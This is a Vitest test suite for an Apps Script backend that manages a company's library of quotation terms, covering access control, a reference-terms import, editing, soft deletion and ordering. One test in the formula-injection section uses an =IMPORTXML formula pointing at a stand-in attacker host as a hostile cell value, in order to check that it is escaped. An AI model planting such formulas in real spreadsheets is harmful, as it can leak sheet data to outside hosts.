import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { installGasFakes, type GasEnvironment } from '../__fixtures__/gas-fakes';
import { handlePost } from '../main';
import { createPasswordRecord } from '../auth/password';
import { createUser } from '../sheets/users-repository';
import { TERMS_SHEET_NAME } from '../sheets/terms-sheet';
import { COMPANY_DRAFT_TERMS, REFERENCE_TERMS } from './import-reference-terms';

const PEPPER = 'test-only-pepper-not-a-real-key';
const PASSWORD = 'TEST_ONLY_correct-horse-battery';

interface Envelope {
  ok: boolean;
  data?: unknown;
  error?: { code: string; message: string; fields?: Record<string, string> };
}

interface PublicTerm {
  id: string;
  title: string;
  bodyTemplate: string;
  category: string;
  sortOrder: number;
  active: boolean;
}

let env: GasEnvironment;
let userToken: string;
let adminToken: string;

function postRaw(body: string): Envelope {
  const output = handlePost(body) as unknown as { getContent: () => string };
  return JSON.parse(output.getContent()) as Envelope;
}

function call(action: string, payload: unknown = {}, token = userToken): Envelope {
  return postRaw(JSON.stringify({ action, requestId: 'test-request', payload, token }));
}

function callAnonymous(action: string, payload: unknown = {}): Envelope {
  return postRaw(JSON.stringify({ action, requestId: 'test-request', payload }));
}

function signIn(email: string, role: 'Admin' | 'User'): string {
  const material = createPasswordRecord(PASSWORD, PEPPER, 1_000);
  createUser({
    email,
    passwordHash: material.hash,
    salt: material.salt,
    iterations: material.iterations,
    role,
  });

  const login = callAnonymous('auth.login', { email, password: PASSWORD });
  return (login.data as { token: string }).token;
}

function terms(includeInactive = false): PublicTerm[] {
  return call('terms.list', { includeInactive }).data as PublicTerm[];
}

beforeEach(() => {
  env = installGasFakes(vi.stubGlobal);
  adminToken = signIn('admin@speedxksa.com', 'Admin');
  userToken = signIn('staff@speedxksa.com', 'User');
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/* -------------------------------------------------------------------------- */

describe('authorization', () => {
  it('refuses every term action without a session', () => {
    for (const action of [
      'terms.list',
      'terms.create',
      'terms.update',
      'terms.deactivate',
      'terms.reorder',
      'admin.importReferenceTerms',
    ]) {
      expect(callAnonymous(action).error?.code, action).toBe('AUTH_REQUIRED');
    }
  });

  it('refuses the reference import to a non-Admin', () => {
    expect(call('admin.importReferenceTerms').error?.code).toBe('FORBIDDEN');
  });

  it('allows a signed-in User the ordinary library actions', () => {
    expect(call('terms.list').ok).toBe(true);
  });
});

describe('no dummy data (PRD §34)', () => {
  it('ships an empty library', () => {
    expect(terms(true)).toEqual([]);
    expect(env.spreadsheet.dataRows(TERMS_SHEET_NAME)).toEqual([]);
  });

  it('does not auto-import on first read', () => {
    call('terms.list');
    call('terms.list');
    expect(env.spreadsheet.dataRows(TERMS_SHEET_NAME)).toEqual([]);
  });
});

describe('the reference import', () => {
  function importTerms(): { imported: number; skipped: number; total: number } {
    return call('admin.importReferenceTerms', {}, adminToken).data as {
      imported: number;
      skipped: number;
      total: number;
    };
  }

  it('inserts the 11 approved terms and the 4 company drafts', () => {
    const result = importTerms();

    expect(REFERENCE_TERMS).toHaveLength(11);
    expect(COMPANY_DRAFT_TERMS).toHaveLength(4);
    expect(result).toEqual({ imported: 15, skipped: 0, total: 15 });
    expect(terms()).toHaveLength(15);
  });

  it('copies the wording verbatim', () => {
    importTerms();
    const imported = terms();

    for (const reference of [...REFERENCE_TERMS, ...COMPANY_DRAFT_TERMS]) {
      const match = imported.find((term) => term.title === reference.title);
      expect(match?.bodyTemplate, reference.title).toBe(reference.bodyTemplate);
    }
  });

  it('is idempotent — a second run inserts nothing', () => {
    importTerms();
    const second = importTerms();

    expect(second).toEqual({ imported: 0, skipped: 15, total: 15 });
    expect(env.spreadsheet.dataRows(TERMS_SHEET_NAME)).toHaveLength(15);
  });

  it('never modifies an existing row (PRD §21)', () => {
    importTerms();
    const before = terms()[0];
    expect(before).toBeDefined();

    call(
      'terms.update',
      { id: before?.id, title: before?.title, bodyTemplate: 'TEST_ONLY edited by a person.' },
      adminToken,
    );

    const rowsBefore = env.spreadsheet.dataRows(TERMS_SHEET_NAME).map((row) => [...row]);
    importTerms();

    expect(env.spreadsheet.dataRows(TERMS_SHEET_NAME)).toEqual(rowsBefore);
  });

  it('leaves {{rate}} unresolvable so a human must supply the real price', () => {
    importTerms();
    const rate = terms().find((term) => term.title === 'Manpower Rate');

    expect(rate?.bodyTemplate).toContain('{{rate}}');
  });

  it('carries the four PRD §20 terms the company supplied, and only those', () => {
    /*
     * These four have no counterpart in `reference/existing-terms.docx`. For
     * most of the project they were deliberately absent, because inventing the
     * wording of a term the company is contractually bound by is not a thing a
     * program may do. The company has now supplied them as DRAFTS.
     *
     * The assertion is on the exact set: a fifth title appearing here would
     * mean something invented one.
     */
    importTerms();
    const titles = terms().map((term) => term.title);

    expect(COMPANY_DRAFT_TERMS.map((term) => term.title).sort()).toEqual([
      'Manpower Replacement',
      'Mobilization',
      'Project Specific Terms',
      'Transportation',
    ]);

    for (const supplied of COMPANY_DRAFT_TERMS) {
      expect(titles, supplied.title).toContain(supplied.title);
    }
  });

  it('keeps the drafts distinct from the approved terms', () => {
    /*
     * REFERENCE_TERMS is transcribed from the company's approved document;
     * COMPANY_DRAFT_TERMS is not approved by anyone. Merging the two lists
     * would erase the only record of which is which, and the four would quietly
     * read as approved company terms from then on.
     */
    const approved = REFERENCE_TERMS.map((term) => term.title);

    for (const draft of COMPANY_DRAFT_TERMS) {
      expect(approved, draft.title).not.toContain(draft.title);
    }
  });

  it('creates no duplicate when a draft title already exists', () => {
    // An Admin who typed one of these in by hand before the import must not
    // end up with two terms of the same name, one of them unreviewed.
    call(
      'terms.create',
      { title: 'Transportation', bodyTemplate: 'Wording the company agreed offline.' },
      adminToken,
    );

    const result = importTerms();

    expect(result.skipped).toBe(1);
    expect(terms().filter((term) => term.title === 'Transportation')).toHaveLength(1);
  });
});

describe('create', () => {
  it('adds a term', () => {
    const response = call('terms.create', {
      title: 'TEST_ONLY Mobilization',
      bodyTemplate: 'TEST_ONLY body for the mobilization term.',
      category: 'Manpower',
    });

    expect(response.ok).toBe(true);
    expect(response.data).toMatchObject({
      title: 'TEST_ONLY Mobilization',
      category: 'Manpower',
      active: true,
    });
  });

  it('validates the title and body lengths', () => {
    const response = call('terms.create', { title: '', bodyTemplate: '' });

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(Object.keys(response.error?.fields ?? {}).sort()).toEqual(['bodyTemplate', 'title']);
  });

  it('rejects a title over 120 characters and a body over 4,000', () => {
    const response = call('terms.create', {
      title: 'x'.repeat(121),
      bodyTemplate: 'y'.repeat(4001),
    });

    expect(Object.keys(response.error?.fields ?? {}).sort()).toEqual(['bodyTemplate', 'title']);
  });

  it('refuses a duplicate title, case-insensitively', () => {
    call('terms.create', { title: 'TEST_ONLY Payment', bodyTemplate: 'TEST_ONLY body text.' });

    const duplicate = call('terms.create', {
      title: 'test_only payment',
      bodyTemplate: 'TEST_ONLY different body text.',
    });

    expect(duplicate.error?.code).toBe('VALIDATION_FAILED');
    expect(duplicate.error?.fields?.['title']).toBeDefined();
  });

  it('strips control characters from the body', () => {
    const created = call('terms.create', {
      title: 'TEST_ONLY Control',
      bodyTemplate: 'clean\u0000body\u0007text',
    }).data as PublicTerm;

    expect(created.bodyTemplate).toBe('cleanbodytext');
  });
});

describe('formula injection (§19.5)', () => {
  it('escapes a body that would otherwise become a live formula', () => {
    call('terms.create', {
      title: 'TEST_ONLY Injection',
      bodyTemplate: '=IMPORTXML("http://attacker.example/x","//a")',
    });

    const cells = env.spreadsheet.dataRows(TERMS_SHEET_NAME).flat();
    for (const cell of cells) {
      if (typeof cell !== 'string') continue;
      expect(['=', '+', '-', '@']).not.toContain(cell.charAt(0));
    }
  });

  it('returns the text unaltered to the client', () => {
    // The apostrophe is a storage detail; a quotation must print what was typed.
    call('terms.create', {
      title: 'TEST_ONLY Leading Plus',
      bodyTemplate: '+15% will be added to the quoted rates.',
    });

    expect(terms()[0]?.bodyTemplate).toBe('+15% will be added to the quoted rates.');
  });
});

describe('update', () => {
  function seed(): PublicTerm {
    return call('terms.create', {
      title: 'TEST_ONLY Overtime',
      bodyTemplate: 'TEST_ONLY overtime body.',
    }).data as PublicTerm;
  }

  it('edits the title and body', () => {
    const created = seed();

    const updated = call('terms.update', {
      id: created.id,
      title: 'TEST_ONLY Overtime & Holidays',
      bodyTemplate: 'TEST_ONLY revised overtime body.',
    });

    expect(updated.ok).toBe(true);
    expect(terms()[0]).toMatchObject({
      title: 'TEST_ONLY Overtime & Holidays',
      bodyTemplate: 'TEST_ONLY revised overtime body.',
    });
  });

  it('reports a missing term clearly', () => {
    expect(
      call('terms.update', { id: 'nope', title: 'TEST_ONLY x', bodyTemplate: 'TEST_ONLY body.' })
        .error?.code,
    ).toBe('VALIDATION_FAILED');
  });

  it('refuses to rename onto another active term', () => {
    seed();
    const second = call('terms.create', {
      title: 'TEST_ONLY Payment',
      bodyTemplate: 'TEST_ONLY payment body.',
    }).data as PublicTerm;

    const clash = call('terms.update', {
      id: second.id,
      title: 'TEST_ONLY Overtime',
      bodyTemplate: 'TEST_ONLY payment body.',
    });

    expect(clash.error?.fields?.['title']).toBeDefined();
  });
});

describe('soft delete', () => {
  function seed(): PublicTerm {
    return call('terms.create', {
      title: 'TEST_ONLY Validity',
      bodyTemplate: 'TEST_ONLY validity body.',
    }).data as PublicTerm;
  }

  it('hides the term from the selector but keeps the row', () => {
    const created = seed();

    call('terms.deactivate', { id: created.id, active: false });

    expect(terms()).toEqual([]);
    expect(terms(true)[0]?.active).toBe(false);
    expect(env.spreadsheet.dataRows(TERMS_SHEET_NAME)).toHaveLength(1);
  });

  it('reactivates', () => {
    const created = seed();

    call('terms.deactivate', { id: created.id, active: false });
    call('terms.deactivate', { id: created.id, active: true });

    expect(terms()).toHaveLength(1);
  });

  it('frees the title for reuse once deactivated', () => {
    const created = seed();
    call('terms.deactivate', { id: created.id, active: false });

    const reused = call('terms.create', {
      title: 'TEST_ONLY Validity',
      bodyTemplate: 'TEST_ONLY replacement body.',
    });

    expect(reused.ok).toBe(true);
  });
});

describe('library ordering', () => {
  function seedThree(): PublicTerm[] {
    for (const title of ['TEST_ONLY First', 'TEST_ONLY Second', 'TEST_ONLY Third']) {
      call('terms.create', { title, bodyTemplate: `${title} body text.` });
    }
    return terms();
  }

  it('lists in sort order', () => {
    expect(seedThree().map((term) => term.title)).toEqual([
      'TEST_ONLY First',
      'TEST_ONLY Second',
      'TEST_ONLY Third',
    ]);
  });

  it('persists a new order', () => {
    const seeded = seedThree();
    const reversed = [...seeded].reverse().map((term) => term.id);

    expect(call('terms.reorder', { ids: reversed }).data).toEqual({ ordered: 3 });
    expect(terms().map((term) => term.title)).toEqual([
      'TEST_ONLY Third',
      'TEST_ONLY Second',
      'TEST_ONLY First',
    ]);
  });

  it('never produces a duplicate sort order', () => {
    const seeded = seedThree();
    call('terms.reorder', { ids: [...seeded].reverse().map((term) => term.id) });

    const orders = terms().map((term) => term.sortOrder);
    expect(new Set(orders).size).toBe(orders.length);
  });

  it('rejects a malformed reorder', () => {
    expect(call('terms.reorder', { ids: 'not-an-array' }).error?.code).toBe('VALIDATION_FAILED');
  });
});
